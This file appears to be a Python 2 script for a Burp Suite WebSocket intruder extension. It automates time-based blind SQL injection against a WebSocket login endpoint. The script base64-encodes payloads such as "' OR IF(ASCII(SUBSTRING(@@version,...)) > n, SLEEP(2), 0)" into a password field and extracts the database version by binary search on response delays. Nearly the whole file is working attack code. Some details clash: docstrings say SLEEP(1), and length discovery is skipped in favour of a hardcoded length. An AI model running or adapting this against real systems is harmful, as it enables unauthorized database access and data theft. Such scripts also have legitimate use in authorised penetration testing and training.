import base64
import time

START_PAYLOAD = '{"auth_user":"YWRtaW4=","auth_pass":"'
END_PAYLOAD   = '"}'

# We'll maintain a simple "state machine" for clarity
STAGE_FIND_LENGTH  = 0  # Looking for the length of @@version
STAGE_EXTRACT_CHAR = 1  # Extracting actual characters
STAGE_COMPLETE     = 2  # Done

current_stage      = STAGE_EXTRACT_CHAR

# For the length-finding stage
current_position   = 1
version_length     = 5

# For the character-extraction stage
char_position      = 1           # Which character index we are extracting
low_ascii          = 32
high_ascii         = 126
found_version      = ""


# -------------------------------------------------------------------
# Helper Functions
# -------------------------------------------------------------------
def queue_websockets(upgrade_request, message):
    """
    Initiates the first payload (or any custom message).
    """
    connection = websocket_connection.create(upgrade_request, Engine.BURP)
    # For demonstration, queue a basic time-delay injection
    connection.queue(
        START_PAYLOAD + base64.b64encode("' OR SLEEP(1); -- initial") + END_PAYLOAD
    )


def build_length_payload(position):
    """
    Payload that checks if LENGTH(@@version) < position.
    If true, triggers SLEEP(1).
    """
    return "' OR IF(LENGTH(@@version) < {}, SLEEP(2), 0); -- check_length".format(position)


def build_char_test_payload(pos, mid):
    """
    Payload that checks if ASCII(SUBSTRING(@@version, pos, 1)) > mid.
    If true, triggers SLEEP(1).
    """
    return "' OR IF(ASCII(SUBSTRING(@@version,{},1)) > {}, SLEEP(2), 0); -- check_char".format(pos, mid)


def handle_outgoing_message(websocket_message, interesting):
    """
    Logs or processes outgoing messages (placeholder).
    """
    results_table.add(websocket_message)


# -------------------------------------------------------------------
# Core Logic: handle_incoming_message
# -------------------------------------------------------------------
def handle_incoming_message(websocket_message, interesting):
    """
    This function is called whenever we receive a response from the server.

    1. Check how long the server took to respond (time-based condition).
    2. Depending on the current stage, update the extraction logic.
    3. Queue the next payload.
    """

    global current_stage, current_position, version_length
    global char_position, low_ascii, high_ascii, found_version

    # Log/store the incoming message
    results_table.add(websocket_message)

    # Calculate time difference
    elapsed_time = websocket_message.getTime()

    # Access the current connection to send the next payload
    connection = websocket_message.getConnection()

    # ---------------------------------------------------------------
    # STAGE 0: Find the length of @@version
    # ---------------------------------------------------------------
    if current_stage == STAGE_FIND_LENGTH:

        if elapsed_time > 2000:
            # Sleep was triggered => LENGTH(@@version) < current_position
            version_length = current_position - 1
            print "Found @@version length: {}".format(version_length)

            # Move to the next stage
            current_stage = STAGE_EXTRACT_CHAR
            # Reset variables for character extraction
            char_position = 1
            low_ascii     = 32
            high_ascii    = 126

            # Build first char test payload (binary search)
            mid_ascii = (low_ascii + high_ascii) // 2
            next_payload = build_char_test_payload(char_position, mid_ascii)

        else:
            # Sleep was NOT triggered => LENGTH(@@version) >= current_position
            current_position += 1
            next_payload = build_length_payload(current_position)

    # ---------------------------------------------------------------
    # STAGE 1: Extract each character using binary search
    # ---------------------------------------------------------------
    elif current_stage == STAGE_EXTRACT_CHAR:

        # If we haven't yet discovered the version length, or we already extracted all chars
        if version_length == 0 or char_position > version_length:
            current_stage = STAGE_COMPLETE
            next_payload  = "' OR SLEEP(0); -- done"
        else:
            # We are mid-binary-search for the ASCII code of the character at 'char_position'
            # We'll retrieve the current low/high from global vars
            mid_ascii = (low_ascii + high_ascii) // 2

            if elapsed_time > 2000:
                # Sleep triggered => ASCII(...) > mid_ascii
                low_ascii = mid_ascii + 1
            else:
                # Sleep not triggered => ASCII(...) <= mid_ascii
                high_ascii = mid_ascii - 1

            # Check if we've narrowed down to a single ASCII
            if low_ascii > high_ascii:
                # We found the character
                found_char = chr(low_ascii)
                found_version += found_char

                print "Extracted char {} -> '{}'".format(char_position, found_char)

                # Prepare to extract the next character
                char_position += 1
                # Reset search bounds for the next character
                low_ascii = 32
                high_ascii = 126

                # If we're done, move on
                if char_position > version_length:
                    current_stage = STAGE_COMPLETE
                    print "Extracted @@version: {}".format(found_version)
                    next_payload = "' OR SLEEP(0); -- done"
                else:
                    # Build next binary search payload
                    mid_ascii = (low_ascii + high_ascii) // 2
                    next_payload = build_char_test_payload(char_position, mid_ascii)
            else:
                # We haven't converged yet; continue narrowing the range
                mid_ascii = (low_ascii + high_ascii) // 2
                next_payload = build_char_test_payload(char_position, mid_ascii)

    # ---------------------------------------------------------------
    # STAGE 2: Completed
    # ---------------------------------------------------------------
    else:
        # No more extraction needed
        print "Extraction complete! @@version = {}".format(found_version)
        next_payload = "' OR SLEEP(0); -- done"

    # ---------------------------------------------------------------
    # Send the next payload (unless we're fully done)
    # ---------------------------------------------------------------
    encoded_payload = base64.b64encode(next_payload)
    connection.queue(START_PAYLOAD + encoded_payload + END_PAYLOAD)



